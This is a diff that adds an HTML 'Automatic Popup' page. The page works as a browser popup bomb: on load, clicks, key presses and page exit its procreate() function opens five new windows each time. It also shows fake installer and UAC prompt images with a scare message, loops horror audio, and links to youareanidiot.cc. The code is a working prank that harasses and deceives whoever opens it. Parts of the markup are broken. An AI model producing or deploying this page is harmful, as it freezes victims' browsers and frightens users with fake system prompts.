@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  <!--====== Design by foolishdeveloper.com =====-->
+  
+  
+    <title>Automatic Popup</title>
+    <!--Google Fonts-->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet">
+    <!--Stylesheets-->
+    <style media="screen">
+      *,
+*:before,
+*:after{
+    padding: 0;
+    margin: 0;
+    box-sizing: border-box;
+}
+body{
+    background-color: #000000;
+}
+.popup{
+    background-color: #ffffff;
+    width: 420px;
+    padding: 30px 40px;
+    position: absolute;
+    transform: translate(-50%,-50%);
+    left: 50%;
+    top: 50%;
+    border-radius: 8px;
+    font-family: "Poppins",sans-serif;
+    display: none; 
+    text-align: center;
+}
+.popup2{
+    background-color: #ffffff;
+    width: 420px;
+    padding: 30px 40px;
+    position: absolute;
+    transform: translate(-50%,-50%);
+    left: 50%;
+    top: 50%;
+    border-radius: 8px;
+    font-family: "Poppins",sans-serif;
+    display: none; 
+    text-align: center;
+}
+.popup button{
+    display: block;
+    margin:  0 0 20px auto;
+    background-color: transparent;
+    font-size: 30px;
+    color: #000000;
+    background: #000000;
+    border-radius: 100%;
+    width: 40px;
+    height: 40px;
+    border: none;
+    outline: none;
+    cursor: pointer;
+}
+.popup2 button{
+    display: block;
+    margin:  0 0 20px auto;
+    background-color: transparent;
+    font-size: 30px;
+    color: #000000;
+    background: #000000;
+    border-radius: 100%;
+    width: 40px;
+    height: 40px;
+    border: none;
+    outline: none;
+    cursor: pointer;
+}
+.popup h2{
+  margin-top: -20px;
+}
+.popup2 h2{
+  margin-top: -20px;
+}
+.popup p{
+    font-size: 14px;
+    text-align: justify;
+    margin: 20px 0;
+    line-height: 25px;
+}
+.popup2 p{
+    font-size: 14px;
+    text-align: justify;
+    margin: 20px 0;
+    line-height: 25px;
+}
+a{
+    display: block;
+    width: 150px;
+    position: relative;
+    margin: 10px auto;
+    text-align: center;
+    background-color: #000000;
+    border-radius: 20px;
+    color: #af0202;
+    text-decoration: none;
+    padding: 8px 0;
+}
+strong {
+    text-align: center;
+    color: red;
+    size: 1200px;
+}
+    </style>
+</head>
+<body onkeydown="procreate()" onclick="procreate()" onbeforeunload="procreate()" onload="procreate()">
+    <div class="popup">
+        
+        
+        <p>
+            <strong>PRESS E 7 times as fast as you can to cancel all 7 setups (behind)</strong>
+            <img class="myvideo"   onclick="procreate()" sizes="1200px" src="./pictures2/UnknownPublisherInstallWindow-1.png"
+             >
+             <img class="myvideo"  onclick="procreate()" sizes="1200px" src="./pictures2/uac-prompt.jpg"
+             
+             
+    
+            
+        </p>
+        <a href="http://youareanidiot.cc">ALLOW</a>
+    </div>
+    <audio id="IdiotAudio" loop><source src="./sounds/horror-atmosphere-background.mp3" type="audio/mp3"></audio>
+    <!--Script-->
+    <script type="text/javascript">
+        function openWindow(url) {
+aWindow = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
+}
+
+function procreate() {
+for (var i = 0; i < 5; i++) {
+    openWindow('hellolol.html');
+   
+}
+}
+        // element which needs to enter full-screen mode
+        var elem = document.getElementById("myvideo");
+
+/* When the openFullscreen() function is executed, open the video in fullscreen.
+Note that we must include prefixes for different browsers, as they don't support the requestFullscreen method yet */
+var myaudio = document.getElementById("IdiotAudio").autoplay = true;
+window.addEventListener("load", function(){
+    setTimeout(
+        function open(event){
+            document.querySelector(".popup").style.display = "block";
+            procreate()
+        },
+        2000 
+        
+    )
+});
+window.addEventListener("load", function(){
+    setTimeout(
+        function open(event){
+            document.querySelector(".popup2").style.display = "block";
+            procreate()
+        },
+        4000 
+    )
+});
+
+
+
+document.querySelector("#close").addEventListener("click", function(){
+    document.querySelector(".popup").style.display = "none";
+});
+    </script>
+</body>
+</html>
